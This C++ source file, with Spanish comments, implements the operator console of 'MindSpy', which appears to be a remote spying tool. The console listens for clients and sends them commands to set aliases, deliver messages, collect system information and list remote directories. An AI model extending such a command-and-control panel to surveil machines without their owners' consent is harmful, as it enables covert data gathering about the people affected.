#include "CPanel.h"

namespace MindSpy
{
	int CPanel::TipoComando(const char*c)
	{
		// Obtener el comando interno con base en un char*
		const int CANTIDAD_COMANDOS = 5;
		char ComandosInternos[CANTIDAD_COMANDOS][16] = { "ALIAS", "ENVIAR", "SYSINFO", "REGINFO", "FILEINFO" };
		for (int i = 0; i < CANTIDAD_COMANDOS; i++)
		{
			if (!strcmp(ComandosInternos[i], c))
				return i;
		}
		return -1;
	}

	void CPanel::Run()
	{

		stringstream str;
		string Comando, Op1, Op2;
		char Mensaje[4096];
		Servidor c;
		int SizeOpcode;
		// Iniciar la escucha del servidor
		if (c.Listo()) c.IniciarEscucha();
		while (true) {
			// Limpiar la memoria del mensaje
			ZeroMemory(Mensaje, sizeof(Mensaje));
			// Esperar por un comando del usuario
			cin.getline(Mensaje, 4096, '\n');
			// Limpiar el stream de comandos
			str.clear();
			// Empujar la cadena de comandos en el stream
			str << Mensaje;
			// Sacar el comando
			str >> Comando;
			// Sacar el primer operando
			str >> Op1;
			// El resto de la cadena es el segundo operando
			getline(str, Op2, '\n');

			// Convertirlo a mayúsculas, se evita strupr
			for (unsigned int i = 0; i < Comando.length(); i++)
			{
				Comando[i] = toupper(Comando[i]);
			}

			// Analizar el comando, y dar una respuesta con base en él
			switch (TipoComando(Comando.c_str()))
			{
			case INTERNOS_CMDS::REQ_ALIAS:
				if (c.SetAlias(Op1.c_str(), Op2.c_str()))
				{
					wcout << L"Alias cambiado." << endl;
				}
				else
				{
					wcout << L"Alias no cambiado." << endl;
				}
				break;

			case INTERNOS_CMDS::REQ_ENVIAR:
				if (c.EnviarComando((char*)Op1.c_str(), Op2.length(), CLNT_CMDS::MENSAJE, (BYTE*)Op2.c_str()))
				{
					wcout << L"Mensaje enviado." << endl;
				}
				else
				{
					wcout << L"Mensaje no enviado." << endl;
				}
				break;

			case INTERNOS_CMDS::REQ_SYSINFO:
				if (c.EnviarComando((char*)Op1.c_str(), NULL, CLNT_CMDS::SYSINFO, NULL))
					wcout << L"Solicitando información de sistema..." << endl;
				break;

			case INTERNOS_CMDS::REQ_FILEINFO: {
				stFileInfoRequest stfir;
				wcsncpy(stfir.Filtro, L"*.*", 4);
				wcsncpy(stfir.Path, L"D:\\", 4);
				stfir.Query = FILEINFO_QUERY::REQ_ONLY_SUBDIR;
				if (c.EnviarComando((char*)Op1.c_str(), NULL, CLNT_CMDS::FILEINFO, (BYTE*)&stfir))
					wcout << L"Solicitando información de archivos...";
				break;
			}
											  
			default:
				cout << "Comando \"" << Comando << "\" no existente" << endl;
			}
		}
	}
}